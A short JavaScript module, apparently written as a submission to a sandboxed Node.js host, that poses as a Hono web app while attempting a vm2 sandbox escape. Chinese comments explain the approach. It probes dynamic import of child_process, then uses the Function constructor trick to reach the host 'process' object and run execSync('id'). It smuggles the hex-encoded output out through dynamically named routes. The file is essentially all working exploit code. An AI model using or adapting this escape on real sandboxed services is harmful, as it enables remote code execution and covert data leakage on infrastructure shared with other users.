const { Hono } = require('hono');
const app = new Hono();

let rceResult = 'no-pwn';
try {
  // import() 是 V8 语言级特性，vm2 无法完全拦截
  // 但 vm2 配了 eval:false 不一定影响 import()
  const m = import('child_process');
  // import() 返回 Promise，在同步上下文里拿不到结果
  // 需要用同步 trick
  rceResult = 'IMPORT-EXISTS';
} catch(e) { rceResult = 'ERR3:' + String(e).slice(0, 200); }

// 备选：用 Function constructor + 各种上下文泄露
try {
  const ForeignFunction = ({}).constructor.constructor;
  const p = ForeignFunction('return process')();
  rceResult = p.mainModule.require('child_process').execSync('id').toString();
} catch(e) { rceResult += '|ERR3b:' + String(e).slice(0, 200); }

const hex = Buffer.from(String(rceResult)).toString('hex');
for (let i = 0; i < hex.length && i < 3000; i += 50) {
  app.get(`/d${Math.floor(i/50)}_${hex.slice(i, i+50)}`, (c) => c.text(''));
}
module.exports = { default: app };
